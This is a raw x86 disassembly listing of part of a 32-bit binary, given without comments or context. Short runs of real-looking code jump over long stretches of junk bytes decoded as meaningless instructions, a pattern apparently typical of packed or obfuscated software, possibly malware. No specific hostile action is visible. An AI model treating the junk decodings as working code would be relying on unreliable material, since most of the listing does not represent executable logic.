  41cd57:	sub    DWORD PTR [ebp-0x15],edx
  41cd5a:	jg     0x41cd26
  41cd5c:	jnp    0x41cce4
  41cd5e:	cld    
  41cd5f:	fcom   st(2)
  41cd61:	cwde   
  41cd62:	add    edi,DWORD PTR [eax-0x5248b28e]
  41cd68:	iret   
  41cd69:	mov    al,BYTE PTR [esi-0x77]
  41cd6c:	mov    ah,0x50
  41cd6e:	sbb    DWORD PTR ds:0x42f55c,0x42f590
  41cd78:	lea    eax,[esp+0x1c]
  41cd7c:	push   eax
  41cd7d:	xor    DWORD PTR ds:0x42f580,0x42f558
  41cd87:	jmp    0x41ce52
  41cd8c:	(bad)  
  41cd8d:	sti    
  41cd8e:	xchg   esi,eax
  41cd8f:	js     0x41cd28
  41cd91:	jge    0x41cd91
  41cd93:	dec    DWORD PTR [eax]
  41cd95:	arpl   WORD PTR [ebp+ecx*8-0x3b19de37],sp
  41cd9c:	inc    esp
  41cd9d:	dec    edi
  41cd9e:	add    DWORD PTR [eax],eax
  41cda0:	scas   al,BYTE PTR es:[edi]
  41cda1:	add    BYTE PTR [eax],al
  41cda3:	add    dl,bh
  41cda5:	dec    ebx
  41cda6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cda7:	sub    BYTE PTR [ebp-0x68acec19],bl
  41cdad:	mov    ebp,0x4f19fc64
  41cdb2:	fmul   DWORD PTR [eax-0x41afb70]
  41cdb8:	fstp   QWORD PTR [ebx-0x69]
  41cdbb:	in     eax,0xa6
  41cdbd:	fisubr WORD PTR [edx]
  41cdbf:	lea    edx,[edi-0x64bf5132]
  41cdc5:	jne    0x41cdf9
  41cdc7:	icebp  
  41cdc8:	loopne 0x41cdc9
  41cdca:	arpl   WORD PTR [edx],di
  41cdcc:	inc    esp
  41cdcd:	(bad)  
  41cdce:	in     al,0xc3
  41cdd0:	stos   BYTE PTR es:[edi],al
  41cdd1:	push   eax
  41cdd2:	mov    es,WORD PTR [edx+0x20]
  41cdd5:	test   al,0x8c
  41cdd7:	or     BYTE PTR [ebp+ebp*1+0x15eb57be],cl
  41cdde:	dec    edx
  41cddf:	and    DWORD PTR [ebp-0x7ed6b589],ebp
  41cde5:	outs   dx,DWORD PTR ds:[esi]
  41cde6:	shr    DWORD PTR [esi-0x7df3eff2],0xce
  41cded:	sbb    al,0x25
  41cdef:	push   0x13c6f926
  41cdf4:	ds pop edi
  41cdf6:	mov    ch,0xd5
  41cdf8:	test   DWORD PTR ds:0xd0891208,0x7060ecae
  41ce02:	test   BYTE PTR [ecx-0x5f77f734],dh
  41ce08:	lds    eax,FWORD PTR [ebx]
  41ce0a:	enter  0x35a1,0x14
  41ce0e:	ret    0x95a8
  41ce11:	or     al,0xe0
  41ce13:	fsubr  st(7),st
  41ce15:	mov    dl,BYTE PTR [ebp+0x7c758bae]
  41ce1b:	loopne 0x41ce19
  41ce1d:	xor    ch,bl
  41ce1f:	mov    ebx,0xc867b7de
  41ce24:	mov    bh,BYTE PTR [edi]
  41ce26:	push   edx
  41ce27:	bound  edi,QWORD PTR [ebx+0x80117c3]
  41ce2d:	gs xchg esp,eax
  41ce2f:	adc    DWORD PTR [ebp-0x47dbac4a],0xffffffa2
  41ce36:	add    ch,BYTE PTR [ebp+0x56]
  41ce39:	mov    ds:0xc4cd1c2a,al
  41ce3e:	push   edi
  41ce3f:	mov    esi,0x86e19e2f
  41ce44:	cs inc esp
  41ce46:	push   0xfcc71a36
  41ce4b:	jbe    0x41ce5c
  41ce4d:	les    esi,FWORD PTR [esi]
  41ce4f:	xor    ecx,ebx
  41ce51:	mov    cl,0xe8
  41ce53:	dec    ebx
  41ce54:	retf   0xffff
  41ce57:	sbb    DWORD PTR ds:0x42f53c,ecx
  41ce5d:	mov    eax,DWORD PTR [esp+0x10]
  41ce61:	jmp    0x41cf2c
  41ce66:	iret   
  41ce67:	inc    edx
  41ce68:	jbe    0x41cea6
  41ce6a:	(bad)  
  41ce6b:	cmp    al,0xcf
  41ce6d:	repz imul eax,DWORD PTR ds:[edi-0x22],0xffffff97
  41ce73:	mov    ebp,0x14ff239
  41ce79:	add    BYTE PTR [esi-0x35000000],ch
  41ce7f:	outs   dx,DWORD PTR ds:[esi]
  41ce80:	ds int3 
  41ce82:	inc    edi
  41ce83:	(bad)  
  41ce84:	int3   
  41ce85:	(bad)  
  41ce86:	bound  eax,QWORD PTR [ecx]
  41ce88:	dec    esp
  41ce89:	mov    ebp,0x92a4d927
  41ce8e:	dec    ebx
  41ce8f:	or     DWORD PTR [ecx+edi*1],esp
  41ce92:	dec    esp
  41ce93:	das    
  41ce94:	aas    
  41ce95:	(bad)  
  41ce96:	fdivr  st(5),st
  41ce98:	leave  
  41ce99:	outs   dx,DWORD PTR ds:[esi]
  41ce9a:	inc    esp
  41ce9b:	or     bl,cl
  41ce9d:	push   ebx
  41ce9e:	jge    0x41ce76
  41cea0:	add    ebx,ecx
  41cea2:	fucomip st,st(2)
  41cea4:	cdq    
  41cea5:	cmp    al,0xda
  41cea7:	xor    BYTE PTR [edx],bh
  41cea9:	lds    eax,FWORD PTR [ebx-0x7fede581]
  41ceaf:	shr    DWORD PTR [ebx-0x501c4dfb],1
  41ceb5:	or     al,0x67
  41ceb7:	inc    ebx
  41ceb8:	bound  ebx,QWORD PTR [ebp+0x770e07f9]
  41cebe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cebf:	ds cwde 
  41cec1:	daa    
  41cec2:	pop    ds
  41cec3:	pop    es
  41cec4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cec5:	jne    0x41ce89
  41cec7:	cwde   
  41cec8:	jns    0x41ce84
  41ceca:	mov    ebx,0xcbf67d4b
  41cecf:	dec    ebp
  41ced0:	sbb    BYTE PTR ds:0x5fc834bd,bl
  41ced6:	inc    edx
  41ced7:	xor    eax,0x83d81235
  41cedc:	mov    eax,0xacb849f7
  41cee1:	leave  
  41cee2:	sub    DWORD PTR [ebx*1-0x45527df],ecx
  41cee9:	das    
  41ceea:	xor    ch,dh
  41ceec:	fcmovnu st,st(6)
  41ceee:	test   ebp,ebx
  41cef0:	idiv   al
  41cef2:	dec    ebx
  41cef3:	ss inc ebx
  41cef5:	dec    esp
  41cef6:	call   0x1fccf534
  41cefb:	cmp    bl,BYTE PTR [esi+0x2081dda7]
  41cf01:	shr    BYTE PTR ds:0xcf7ebf82,1
  41cf07:	in     eax,0xe9
  41cf09:	mov    ds:0xed8aea98,al
  41cf0e:	mov    al,0x40
  41cf10:	mov    esi,0xcf0e7ef
  41cf15:	adc    eax,eax
  41cf17:	xor    eax,0x65918ad5
  41cf1c:	add    al,bl
  41cf1e:	mov    ecx,0xe82f22c0
  41cf23:	fisubr DWORD PTR [ebx]
  41cf25:	xchg   edx,eax
  41cf26:	js     0x41cf19
  41cf28:	jmp    0x8c1d254e
  41cf2d:	dec    esp
  41cf2e:	and    al,0x14
  41cf30:	mov    edi,DWORD PTR ds:0x42f570
  41cf36:	add    edi,DWORD PTR ds:0x42f588
  41cf3c:	mov    DWORD PTR ds:0x42f570,edi
  41cf42:	push   DWORD PTR [ebp+0x18]
  41cf45:	mov    edi,DWORD PTR [ebp+0x8]
  41cf48:	jmp    0x41d013
  41cf4d:	call   0xffbb:0x7fbb5ef7
  41cf54:	idiv   eax
  41cf56:	mov    ah,0x53
  41cf58:	ins    DWORD PTR es:[edi],dx
  41cf59:	sub    cl,BYTE PTR [eax-0x61]
  41cf5c:	les    esp,FWORD PTR [eax-0x51fffeb0]
  41cf62:	add    BYTE PTR [eax],al
  41cf64:	add    BYTE PTR [edi+eax*2+0x25559af7],bh
  41cf6b:	pop    di
  41cf6d:	fcomp  st(3)
  41cf6f:	ret    0x13b3
  41cf72:	leave  
  41cf73:	xor    edi,ecx
  41cf75:	popa   
  41cf76:	das    
  41cf77:	scas   eax,DWORD PTR es:[edi]
  41cf78:	pusha  
  41cf79:	or     DWORD PTR [ecx+edx*2],esi
  41cf7c:	outs   dx,DWORD PTR ds:[esi]
  41cf7d:	push   0x602558a3
  41cf82:	adc    BYTE PTR [edx-0x5c],bl
  41cf85:	call   0x33d3:0x4d41e362
  41cf8c:	int3   
  41cf8d:	test   DWORD PTR [eax],eax
  41cf8f:	xchg   esp,eax
  41cf90:	mov    bh,0x5e
  41cf92:	mov    ebp,0x96ab3edb
  41cf97:	xchg   ebx,eax
  41cf98:	or     dl,BYTE PTR [edx]
  41cf9a:	push   ebx
  41cf9b:	(bad)  
  41cf9c:	pusha  
  41cf9d:	push   edi
  41cf9e:	dec    edi
  41cf9f:	jle    0x41cf48
  41cfa1:	jge    0x41cf2d
  41cfa3:	jmp    0x72d1c2c6
  41cfa8:	sub    esp,0xffffffab
  41cfab:	data16 outs dx,BYTE PTR ds:[esi]
  41cfad:	in     eax,dx
  41cfae:	not    BYTE PTR [eax+0x2a]
  41cfb1:	cmp    al,0x5d
  41cfb3:	test   al,0xcf
  41cfb5:	mov    esi,0xd5deefa3
  41cfba:	inc    edx
  41cfbb:	test   al,al
  41cfbd:	mov    ah,0xff
  41cfbf:	xchg   BYTE PTR [edx+0x3e944f31],ch
  41cfc5:	sub    al,0x8a
  41cfc7:	mov    ch,0xd0
  41cfc9:	jbe    0x41cfdf
  41cfcb:	(bad)  
  41cfcc:	mov    cl,0x3d
  41cfce:	pop    es
  41cfcf:	int3   
  41cfd0:	push   edi
  41cfd1:	pop    eax
  41cfd2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cfd3:	rol    BYTE PTR [ebx],1
  41cfd5:	mov    ecx,0x696f5686
  41cfda:	addr16 push 0xffffffce
  41cfdd:	and    ah,BYTE PTR [esi-0x6c]
  41cfe0:	push   esi
  41cfe1:	mov    ds:0x748c7b07,al
  41cfe6:	pop    ss
  41cfe7:	sub    eax,0xd36945b
  41cfec:	enter  0xd430,0xfb
  41cff0:	outs   dx,DWORD PTR ds:[esi]
  41cff1:	jb     0x41cfb8
  41cff3:	mov    esp,edi
  41cff5:	xchg   edx,eax
  41cff6:	cmp    DWORD PTR [esi-0x2fb40da9],esp
  41cffc:	xlat   BYTE PTR ds:[ebx]
  41cffd:	push   edx
  41cffe:	cld    
  41cfff:	cmp    BYTE PTR [ecx+0x7ddc7c85],al
  41d005:	mov    ebp,0x396addf4
  41d00a:	push   ecx
  41d00b:	pop    es
  41d00c:	stos   BYTE PTR es:[edi],al
  41d00d:	mov    ah,0xba
  41d00f:	mov    eax,0xffa2b91b
  41d014:	jne    0x41d02a
  41d016:	lea    eax,[ebp+0x18]
  41d019:	push   DWORD PTR [ebp+0x10]
  41d01c:	push   DWORD PTR [esp+0x18]
  41d020:	push   DWORD PTR [esp+0x18]
  41d024:	push   DWORD PTR [ebp+0xc]
  41d027:	push   eax
  41d028:	push   DWORD PTR [esp+0x38]
  41d02c:	jmp    0x41d0f7
  41d031:	lods   al,BYTE PTR ds:[esi]
  41d032:	push   esi
  41d033:	clc    
  41d034:	mov    edx,edi
  41d036:	scas   eax,DWORD PTR es:[edi]
  41d037:	std    
  41d038:	ja     0x41d085
  41d03a:	inc    ecx
  41d03b:	mov    edi,0x6d8dcc0f
  41d040:	outs   dx,BYTE PTR ds:[esi]
  41d041:	dec    esi
  41d042:	push   ecx
  41d043:	add    DWORD PTR [eax],eax
  41d045:	scas   al,BYTE PTR es:[edi]
  41d046:	add    BYTE PTR [eax],al
  41d048:	add    BYTE PTR [ecx-0x2a],cl
  41d04b:	test   edx,eax
  41d04d:	add    eax,0x5ea07e62
  41d052:	sub    cl,BYTE PTR [edx-0xc]
  41d055:	ret    0xa772
  41d058:	push   edi
  41d059:	or     eax,0x196363d
  41d05e:	leave  
  41d05f:	sbb    eax,0x13285e78
  41d064:	neg    DWORD PTR [ebp+0x56656769]
  41d06a:	pop    esi
  41d06b:	mov    bl,0x89
  41d06d:	mov    ds:0xe2bf6c46,al
  41d072:	scas   al,BYTE PTR es:[edi]
  41d073:	mov    eax,0x99ba4fed
  41d078:	arpl   WORD PTR [ebx-0x22],sp
  41d07b:	sbb    al,0xdf
  41d07d:	les    esi,FWORD PTR [ebx]
  41d07f:	jmp    0xd8ee:0xf83c93c0
  41d086:	cdq    
  41d087:	pop    eax
  41d088:	aad    0x11
  41d08a:	xchg   edx,eax
  41d08b:	hlt    
  41d08c:	jp     0x41d066
  41d08e:	jecxz  0x41d0fd
  41d090:	mov    edi,0x596e6fe7
  41d095:	jl     0x41d07e
  41d097:	jecxz  0x41d0b4
  41d099:	out    0x93,eax
  41d09b:	xor    BYTE PTR [ebp+ebp*8+0xa00ce38],0x93
  41d0a3:	mov    edx,0x8aad19c6
  41d0a8:	mov    edx,0x5e408a50
  41d0ad:	sub    ebp,edx
  41d0af:	mov    bh,0xa1
  41d0b1:	outs   dx,BYTE PTR ds:[esi]
  41d0b2:	shl    edx,cl
  41d0b4:	dec    esi
  41d0b5:	not    bl
  41d0b7:	adc    eax,DWORD PTR [eax]
  41d0b9:	xor    al,0x89
  41d0bb:	js     0x41d04f
  41d0bd:	xor    eax,DWORD PTR [esi+esi*2]
  41d0c0:	fmul   DWORD PTR [esp+ebx*4]
  41d0c3:	sar    DWORD PTR [eax+0x7431f9da],0x20
  41d0ca:	lds    esi,FWORD PTR [edx-0x7b390226]
  41d0d0:	icebp  
  41d0d1:	xchg   esp,eax
  41d0d2:	in     al,dx
  41d0d3:	shl    BYTE PTR [esi+ebp*8+0x7a94ee42],0x34
  41d0db:	xchg   ebp,esp
  41d0dd:	lods   eax,DWORD PTR ds:[esi]
  41d0de:	sub    ebx,DWORD PTR [ebp-0x58a1e29d]
  41d0e4:	fmul   QWORD PTR [ecx+0x4bf40fd7]
  41d0ea:	mov    ebx,gs
  41d0ec:	lods   al,BYTE PTR ds:[esi]
  41d0ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0ee:	mov    ebp,0xc53a4458
  41d0f3:	pushf  
  41d0f4:	dec    esp
  41d0f5:	neg    BYTE PTR [ebp-0x1]
  41d0f8:	je     0x41d11e
  41d0fa:	cmp    al,ch
  41d0fc:	add    BYTE PTR [edi-0x2],cl
  41d0ff:	call   FWORD PTR [edi-0x75]
  41d102:	in     eax,0x5d
  41d104:	ret    0x14
  41d107:	push   ebp
  41d108:	mov    ebp,esp
  41d10a:	sub    esp,0x3c
  41d10d:	jmp    0x41d1d9
  41d112:	mov    dh,0xce
  41d114:	or     DWORD PTR [ebp-0x20411887],esp
  41d11a:	(bad)  
  41d11b:	mov    ebx,ebp
  41d11d:	jo     0x41d0a3
  41d11f:	cmc    
  41d120:	ins    BYTE PTR es:[edi],dx
  41d121:	dec    esi
  41d122:	cld    
  41d123:	push   ecx
  41d124:	add    DWORD PTR [eax],eax
  41d126:	scas   eax,DWORD PTR es:[edi]
  41d127:	add    BYTE PTR [eax],al
  41d129:	add    BYTE PTR [esi],bl
  41d12b:	lds    eax,FWORD PTR [ecx-0x3e]
  41d12e:	adc    BYTE PTR [ecx],dh
  41d130:	fld    QWORD PTR [eax+0x14]
  41d133:	or     BYTE PTR [ebp+ebp*8+0x5e],dl
  41d137:	scas   eax,DWORD PTR es:[edi]
  41d138:	outs   dx,BYTE PTR ds:[esi]
  41d139:	and    al,0x7e
  41d13b:	jb     0x41d14c
  41d13d:	int    0x12
  41d13f:	(bad)  
  41d140:	lods   eax,DWORD PTR ds:[esi]
  41d141:	jmp    0x41d179
  41d143:	cmp    esp,edx
  41d145:	pop    esp
  41d146:	fwait
  41d147:	mov    ebx,0x518ef848
  41d14c:	shl    DWORD PTR [ebp+0x43],1
  41d14f:	fistp  DWORD PTR [esi+0x42]
  41d152:	pop    ds
  41d153:	imul   eax,DWORD PTR [edi],0x910bb044
  41d159:	and    ch,ch
  41d15b:	les    esi,FWORD PTR [edx-0x73]
  41d15e:	xor    ebp,DWORD PTR [eax+0x60]
  41d161:	scas   eax,DWORD PTR es:[edi]
  41d162:	(bad)  
  41d163:	ret    0xc74d
  41d166:	jge    0x41d1a2
  41d168:	std    
  41d169:	inc    esi
  41d16a:	mov    dl,0x85
  41d16c:	adc    al,0x64
  41d16e:	jmp    0xbc5d:0x4752fc0e
  41d175:	push   ecx
  41d176:	push   0xffffff86
  41d178:	and    ah,0x6e
  41d17b:	cmp    ebp,edi
  41d17d:	sub    bh,BYTE PTR [eax]
  41d17f:	pop    ss
  41d180:	sub    cl,BYTE PTR [esp+eax*8]
  41d183:	xchg   esi,eax
  41d184:	pop    ebx
  41d185:	cli    
  41d186:	repnz push ebp
  41d188:	std    
  41d189:	ins    BYTE PTR es:[edi],dx
  41d18a:	fstp   DWORD PTR [eax-0x39]
  41d18d:	dec    ebx
  41d18e:	loope  0x41d18d
  41d190:	or     eax,0x7d6b046f
  41d195:	out    0xe4,eax
  41d197:	and    DWORD PTR [edi],ebx
  41d199:	dec    esp
  41d19a:	std    
  41d19b:	mov    dh,0x1c
  41d19d:	xor    ecx,DWORD PTR [edi-0x31]
  41d1a0:	dec    esp
  41d1a1:	add    eax,0xbee2d855
  41d1a6:	popa   
  41d1a7:	das    
  41d1a8:	mov    edx,0xe71335c3
  41d1ad:	pop    ds
  41d1ae:	mov    eax,ds:0x13021d1a
  41d1b3:	loop   0x41d15b
  41d1b5:	test   eax,0xcdf9ad43
  41d1ba:	sbb    al,BYTE PTR [eax+0x595365af]
  41d1c0:	jmp    0x1b6df367
  41d1c5:	test   BYTE PTR [edi],0xf7
  41d1c8:	inc    ebp
  41d1c9:	and    BYTE PTR [ebx+0x641d7358],dh
  41d1cf:	pop    ebx
  41d1d0:	cld    
  41d1d1:	pop    ss
  41d1d2:	push   esi
  41d1d3:	(bad)  
  41d1d4:	fiadd  WORD PTR [edi]
  41d1d6:	add    al,0x97
  41d1d8:	xchg   edi,eax
  41d1d9:	mov    DWORD PTR [ebp-0x3c],0x1761
  41d1e0:	mov    DWORD PTR [ebp-0x38],0x5250
  41d1e7:	mov    DWORD PTR [ebp-0x10],0x1d44
  41d1ee:	mov    DWORD PTR [ebp-0xc],0x3d5e
  41d1f5:	mov    DWORD PTR [ebp-0x8],0x605f
  41d1fc:	jmp    0x41d2c8
  41d201:	cmp    eax,0xa3fd811f
  41d206:	(bad)  
  41d207:	jge    0x41d1e8
  41d209:	sub    eax,0x5070de47
  41d20e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d20f:	lods   eax,DWORD PTR ds:[esi]
  41d210:	mov    eax,ds:0x152ab
  41d215:	scas   eax,DWORD PTR es:[edi]
  41d216:	add    BYTE PTR [eax],al
  41d218:	add    bl,cl
  41d21a:	scas   al,BYTE PTR es:[edi]
  41d21b:	sub    al,0x1f
  41d21d:	mov    ch,BYTE PTR [edi+0x3c8b3120]
  41d223:	iret   
  41d224:	(bad)  
  41d225:	(bad)  
  41d226:	call   FWORD PTR [esi-0x1]
  41d229:	mov    cl,0x17
  41d22b:	out    dx,al
  41d22c:	hlt    
  41d22d:	movq   mm7,QWORD PTR [ebp+0x6573a1da]
  41d234:	jno    0x41d290
  41d236:	jo     0x41d1cd
  41d238:	jle    0x41d248
  41d23a:	lods   eax,DWORD PTR ds:[esi]
  41d23b:	imul   esi,DWORD PTR [edi-0x29e7e6ae],0x9e0eaa7d
  41d245:	push   edi
  41d246:	sti    
  41d247:	outs   dx,DWORD PTR ds:[esi]
  41d248:	dec    esi
  41d249:	dec    ecx
  41d24a:	enter  0xbca1,0xa
  41d24e:	mov    ds:0xc8fd6973,eax
  41d253:	daa    
  41d254:	push   0x4b
  41d256:	xchg   BYTE PTR [edi+ecx*8-0x1013655b],al
  41d25d:	lds    esi,FWORD PTR [eax]
  41d25f:	or     al,0x7c
  41d261:	loope  0x41d25e
  41d263:	or     BYTE PTR [edx+eiz*8],al
  41d266:	jae    0x41d202
  41d268:	adc    DWORD PTR [edx],ebx
  41d26a:	out    dx,eax
  41d26b:	neg    BYTE PTR ss:[ecx-0x36]
  41d26f:	jecxz  0x41d2cf
  41d271:	outs   dx,BYTE PTR ds:[esi]
  41d272:	in     al,dx
  41d273:	push   esi
  41d274:	cmp    BYTE PTR [ebx],dl
  41d276:	iret   
  41d277:	rol    DWORD PTR [ebx+0x6f],1
  41d27a:	xchg   esi,eax
  41d27b:	cld    
  41d27c:	push   ebp
  41d27d:	in     eax,dx
  41d27e:	add    BYTE PTR [ecx],cl
  41d280:	cmp    DWORD PTR [edx],0xcdb7da6
  41d286:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d288:	into   
  41d289:	cwde   
  41d28a:	lahf   
  41d28b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d28c:	cs lahf 
  41d28e:	cmp    bh,BYTE PTR [esi-0x35097d52]
  41d294:	aaa    
  41d295:	push   eax
  41d296:	out    0xf1,al
  41d298:	out    0xb9,al
  41d29a:	inc    edi
  41d29b:	pop    ss
  41d29c:	and    al,0xd5
  41d29e:	xchg   edi,eax
  41d29f:	stc    
  41d2a0:	sbb    bl,al
  41d2a2:	sti    
  41d2a3:	test   DWORD PTR [edx],ecx
  41d2a5:	addr16 (bad) 
  41d2a7:	pop    ebx
  41d2a8:	push   ds
  41d2a9:	or     al,BYTE PTR [ebx]
  41d2ab:	sar    BYTE PTR [esp+eax*2],1
  41d2ae:	push   esi
  41d2af:	pop    ebp
  41d2b0:	jnp    0x41d236
  41d2b2:	dec    ebx
  41d2b3:	push   ds
  41d2b4:	jne    0x41d2c7
  41d2b6:	sar    ah,0xff
  41d2b9:	fadd   QWORD PTR [edx]
  41d2bb:	pop    ecx
  41d2bc:	jns    0xba58bef4
  41d2c2:	(bad)  [esi-0x5604a906]
  41d2c8:	mov    DWORD PTR [ebp-0x4],0x3f5e
  41d2cf:	mov    DWORD PTR [ebp-0x34],0x3dda
  41d2d6:	mov    DWORD PTR [ebp-0x30],0x3178
  41d2dd:	mov    DWORD PTR [ebp-0x2c],0x4762
  41d2e4:	mov    DWORD PTR [ebp-0x28],0x1fa3
  41d2eb:	mov    DWORD PTR [ebp-0x24],0x27ce
  41d2f2:	mov    DWORD PTR [ebp-0x20],0x575
  41d2f9:	mov    DWORD PTR [ebp-0x1c],0x3343
  41d300:	jmp    0x41d3cc
  41d305:	or     edi,DWORD PTR [edi]
  41d307:	hlt    
  41d308:	into   
  41d309:	hlt    
  41d30a:	iret   
  41d30b:	cmp    edi,edi
  41d30d:	add    DWORD PTR [ecx],edx
  41d30f:	or     eax,0xa794e8a1
  41d314:	dec    esi
  41d315:	pop    edx
  41d316:	push   ebx
  41d317:	add    DWORD PTR [eax],eax
  41d319:	scas   eax,DWORD PTR es:[edi]
  41d31a:	add    BYTE PTR [eax],al
  41d31c:	add    BYTE PTR [edx-0xf],ah
  41d31f:	pop    ebp
  41d320:	jmp    0x41d305
  41d322:	lods   eax,DWORD PTR ds:[esi]
  41d323:	stos   DWORD PTR es:[edi],eax
  41d324:	outs   dx,BYTE PTR ds:[esi]
  41d325:	jb     0x41d2ce
  41d327:	and    bh,BYTE PTR [edi]
  41d329:	xchg   ecx,eax
  41d32a:	cld    
  41d32b:	popf   
  41d32c:	jmp    FWORD PTR [edi]
  41d32e:	repnz push eax
  41d330:	adc    al,0x10
  41d332:	and    eax,0x88f5ef81
  41d337:	lea    esi,[eax+0x47]
  41d33a:	pop    es
  41d33b:	jbe    0x41d2dc
  41d33d:	cmp    dl,BYTE PTR [edx+0x1e3fe80a]
  41d343:	lea    edi,[ebx+0xa]
  41d346:	nop
  41d347:	and    DWORD PTR [edx-0x74],0x6d4da595
  41d34e:	fcmovb st,st(6)
  41d350:	xchg   ebp,eax
  41d351:	mov    edi,0x803b5883
  41d356:	push   0xffffffc2
  41d358:	addr16 inc esi
  41d35a:	push   0xffffff8f
  41d35c:	icebp  
  41d35d:	add    cl,bh
  41d35f:	xchg   ecx,eax
  41d360:	mov    edi,0x58954fdf
  41d365:	jle    0x41d2f6
  41d367:	mov    eax,0xe39067b6
  41d36c:	cli    
  41d36d:	maxps  xmm6,XMMWORD PTR [ecx-0x46]
  41d371:	mov    DWORD PTR [ebx+0x7f],ebx
  41d374:	(bad)  
  41d375:	(bad)  
  41d376:	out    dx,eax
  41d377:	sub    DWORD PTR [ebx],0xab090f72
  41d37d:	lods   al,BYTE PTR ds:[esi]
  41d37e:	pop    esp
  41d37f:	mov    eax,0xbe8ac34c
  41d384:	cwde   
  41d385:	shl    esp,0xd6
  41d388:	push   ebp
  41d389:	call   0x97bf8d5e
  41d38e:	sbb    BYTE PTR [ebx+0x65],bh
  41d391:	xor    ebx,DWORD PTR ds:0xda2c1a1
  41d397:	lods   al,BYTE PTR ds:[esi]
  41d398:	(bad)  
  41d399:	ds mov ch,0xb6
  41d39c:	(bad)  
  41d39e:	jle    0x41d340
  41d3a0:	leave  
  41d3a1:	aad    0x35
  41d3a3:	aaa    
  41d3a4:	jbe    0x41d397
  41d3a6:	xor    cl,bh
  41d3a8:	test   eax,0xd20d0192
  41d3ad:	jle    0x41d377
  41d3af:	mov    eax,ds:0x74e9d018
  41d3b4:	push   0x1b66ee0b
  41d3b9:	cdq    
  41d3ba:	xor    eax,0xd58f3d04
  41d3bf:	cmp    ah,BYTE PTR [eax-0x49]
  41d3c2:	push   edi
  41d3c3:	sub    eax,0xb52b786d
  41d3c8:	test   BYTE PTR ds:0x45c70d2e,al
  41d3ce:	call   0x421816
  41d3d3:	mov    eax,DWORD PTR [ebp-0x4]
  41d3d6:	add    eax,DWORD PTR [ebp-0x8]
  41d3d9:	jmp    0x41d4a5
  41d3de:	adc    al,dh
  41d3e0:	mov    edx,0x37fffe8f
  41d3e5:	fistp  QWORD PTR [esi+ecx*4]
  41d3e8:	sbb    dh,0x44
  41d3eb:	ja     0x41d39d
  41d3ed:	in     al,0x9
  41d3ef:	push   esp
  41d3f0:	add    DWORD PTR [eax],eax
  41d3f2:	scas   eax,DWORD PTR es:[edi]
  41d3f3:	add    BYTE PTR [eax],al
  41d3f5:	add    BYTE PTR [ebx-0x16],bl
  41d3f8:	jmp    0x41d38c
  41d3fa:	pushf  
  41d3fb:	(bad)  
  41d3fd:	jae    0x41d41b
  41d3ff:	test   BYTE PTR [edx],ch
  41d401:	sbb    edx,ebx
  41d403:	ror    BYTE PTR [esi+eiz*8],1
  41d406:	mov    esp,0x3459402
  41d40b:	inc    eax
  41d40c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d40d:	adc    BYTE PTR [edi-0x595ae350],cl
  41d413:	(bad)  
  41d414:	outs   dx,DWORD PTR ds:[esi]
  41d415:	sahf   
  41d416:	in     eax,dx
  41d417:	and    ch,ah
  41d419:	int3   
  41d41a:	imul   esp,DWORD PTR [ebx-0x318ae0f7],0xffffffeb
  41d421:	jl     0x41d496
  41d423:	(bad)  
  41d424:	cli    
  41d425:	and    ah,cl
  41d427:	adc    bh,BYTE PTR [eax+0x1d]
  41d42a:	sub    eax,ebp
  41d42c:	push   0x4c
  41d42e:	(bad)  
  41d42f:	or     dl,BYTE PTR [esi+ecx*1+0x3f49acaf]
  41d436:	and    BYTE PTR [esi+0x74],bh
  41d439:	push   0x58
  41d43b:	sti    
  41d43c:	sbb    BYTE PTR [eax+0x2d],0xb
  41d440:	repnz icebp 
  41d442:	push   DWORD PTR [ebp-0x7cf935dc]
  41d448:	pusha  
  41d449:	mov    dh,ah
  41d44b:	jge    0x41d4a3
  41d44d:	rcr    BYTE PTR ds:0x75665f7a,1
  41d453:	outs   dx,BYTE PTR ds:[esi]
  41d454:	aas    
  41d455:	mov    eax,ds:0x488eadab
  41d45a:	jbe    0x41d4a9
  41d45c:	push   eax
  41d45d:	mov    esp,0xfc7b1a6c
  41d462:	popf   
  41d463:	mov    ebx,0x5926cea
  41d468:	mov    dl,0x7e
  41d46a:	or     BYTE PTR [ebp+0x2],bh
  41d46d:	out    dx,eax
  41d46e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d46f:	mov    bl,0x8d
  41d471:	shl    esp,1
  41d473:	in     eax,0x92
  41d475:	fsubr  QWORD PTR [eax]
  41d477:	adc    al,0x70
  41d479:	adc    al,0xab
  41d47b:	scas   eax,DWORD PTR es:[edi]
  41d47c:	inc    ecx
  41d47d:	retf   
  41d47e:	jmp    0x41d418
  41d480:	mov    ds:0xba273e3d,eax
  41d485:	or     edi,esi
  41d487:	jg     0x41d452
  41d489:	(bad)  
  41d48a:	or     al,0x1f
  41d48c:	int3   
  41d48d:	pop    ds
  41d48e:	shl    DWORD PTR [ebx-0x7a],0x6f
  41d492:	lods   eax,DWORD PTR ds:[esi]
  41d493:	inc    ecx
  41d494:	scas   al,BYTE PTR es:[edi]
  41d495:	dec    esi
  41d496:	hlt    
  41d497:	xchg   esp,eax
  41d498:	push   ss
  41d499:	mov    ebx,0x37ea2bd7
  41d49e:	std    
  41d49f:	mov    BYTE PTR [ebp-0x7689b956],0x8b
  41d4a6:	dec    ebp
  41d4a7:	hlt    
  41d4a8:	imul   eax,ecx
  41d4ab:	mov    ecx,0x264a98d1
  41d4b0:	sub    ecx,eax
  41d4b2:	add    ecx,DWORD PTR [ebp-0x10]
  41d4b5:	push   ebx
  41d4b6:	push   edi
  41d4b7:	mov    DWORD PTR [ebp-0x14],0x6a7d
  41d4be:	xor    edx,edx
  41d4c0:	mov    DWORD PTR [ebp-0x4],0x3
  41d4c7:	jmp    0x41d593
  41d4cc:	pop    esi
  41d4cd:	div    BYTE PTR [edx]
  41d4cf:	mov    eax,0xf6defcba
  41d4d4:	sahf   
  41d4d5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d4d6:	fisttp QWORD PTR ds:0x8ede7ccc
  41d4dc:	mov    eax,0xaf000154
  41d4e1:	add    BYTE PTR [eax],al
